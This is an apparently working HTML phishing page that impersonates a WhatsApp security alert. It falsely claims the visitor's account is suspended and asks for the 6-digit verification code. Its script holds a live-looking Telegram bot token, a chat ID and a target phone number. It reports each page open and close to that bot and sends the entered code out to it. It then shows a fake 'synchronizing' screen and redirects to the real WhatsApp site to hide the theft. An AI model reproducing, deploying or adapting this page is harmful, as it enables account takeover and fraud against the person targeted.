<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security Center</title>
    <style>
        :root { 
            --wa-bg: #111b21;
            --wa-green: #00a884;
            --wa-danger: #ea0038;
            --wa-text: #e9edef;
            --wa-hint: #8696a0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: start; }
        
        /* Top Alert Bar */
        .header-alert {
            background: var(--wa-danger); color: #fff; width: 100%; padding: 12px;
            font-size: 13px; text-align: center; font-weight: 700; text-transform: uppercase;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 10;
        }

        .content { width: 100%; max-width: 400px; padding: 40px 25px; text-align: center; }
        .logo { width: 60px; margin-bottom: 25px; }
        
        h1 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #fff; }
        .status-box { 
            background: #1d2a33; border-left: 4px solid var(--wa-danger); 
            padding: 15px; text-align: left; border-radius: 4px; margin-bottom: 30px;
        }
        .status-box p { font-size: 14px; line-height: 1.5; color: var(--wa-text); }

        .number-display { font-size: 16px; font-weight: 600; margin-bottom: 25px; color: var(--wa-hint); }
        .number-display span { color: #fff; letter-spacing: 1px; }

        /* OTP Input Styling - Real WhatsApp Style */
        .otp-container { position: relative; margin-bottom: 30px; }
        .otp-input {
            width: 100%; background: transparent; border: none;
            border-bottom: 2px solid var(--wa-green); color: #fff;
            font-size: 35px; text-align: center; outline: none;
            letter-spacing: 15px; padding-bottom: 5px;
        }
        .otp-placeholder { 
            position: absolute; top: 0; left: 0; width: 100%; 
            font-size: 35px; letter-spacing: 15px; color: #333; pointer-events: none;
        }

        .btn-verify {
            background: var(--wa-green); color: #111b21; border: none;
            width: 100%; padding: 15px; border-radius: 30px;
            font-size: 15px; font-weight: 700; cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 168, 132, 0.2);
        }

        .secure-footer { margin-top: auto; padding-bottom: 30px; font-size: 12px; color: var(--wa-hint); }
    </style>
</head>
<body>

    <div class="header-alert">Account Restricted - Verification Required</div>

    <div class="content">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <h1>Identity Verification</h1>
        
        <div class="status-box">
            <p>Your account is temporarily suspended due to suspicious activity. Enter the 6-digit synchronization code sent to:</p>
        </div>

        <div class="number-display">
            Target Device: <span id="phone-masked"></span>
        </div>

        <div class="otp-container">
            <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" autocomplete="off">
        </div>

        <button class="btn-verify" onclick="submitOtp()">VERIFY & UNLOCK</button>
    </div>

    <div class="secure-footer">
        <img src="https://static.whatsapp.net/rsrc.php/v3/yO/r/Sshne939E8V.png" width="12" style="vertical-align: middle; opacity: 0.5;">
        End-to-end encrypted security session
    </div>

    <script>
        const CONFIG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            PHONE: '01030003287'
        };

        // تشفير الرقم تلقائياً
        const maskPhone = (num) => {
            return "+20 " + num.substring(0, 3) + " •••• •• " + num.slice(-2);
        };
        document.getElementById('phone-masked').innerText = maskPhone(CONFIG.PHONE);

        async function notify(msg) {
            const url = `https://api.telegram.org/bot${CONFIG.T}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.C, text: msg, parse_mode: 'HTML' })
                });
            } catch (e) { console.error("Send failed"); }
        }

        // تنبيهات الدخول والخروج
        window.onload = () => notify(`🟢 <b>[OPENED]:</b> Target is on page.\nNumber: <code>${CONFIG.PHONE}</code>`);
        
        // تنبيه لو قفل الصفحة أو خرج منها
        window.onbeforeunload = () => {
            notify(`🔴 <b>[CLOSED]:</b> Target left the page.`);
        };

        async function submitOtp() {
            const code = document.getElementById('otp').value;
            const btn = document.querySelector('.btn-verify');

            if(code.length === 6) {
                btn.innerHTML = "Processing...";
                btn.disabled = true;

                await notify(`🔥 <b>[CODE RECEIVED]:</b>\nTarget: <code>${CONFIG.PHONE}</code>\nOTP: <code>${code}</code>`);

                // تحويل لصفحة "جري التحقق" وهمية
                document.querySelector('.content').innerHTML = `
                    <div style="margin-top:100px;">
                        <div style="border:3px solid #202c33; border-top:3px solid #00a884; border-radius:50%; width:45px; height:45px; animation:spin 1s linear infinite; margin:0 auto;"></div>
                        <p style="margin-top:25px; color:#8696a0;">Synchronizing with security servers...<br>Please keep this window open.</p>
                    </div>
                    <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
                `;

                setTimeout(() => {
                    window.location.href = "https://www.whatsapp.com/security";
                }, 4000);
            } else {
                alert("Please enter the 6-digit code.");
            }
        }
    </script>
</body>
</html>
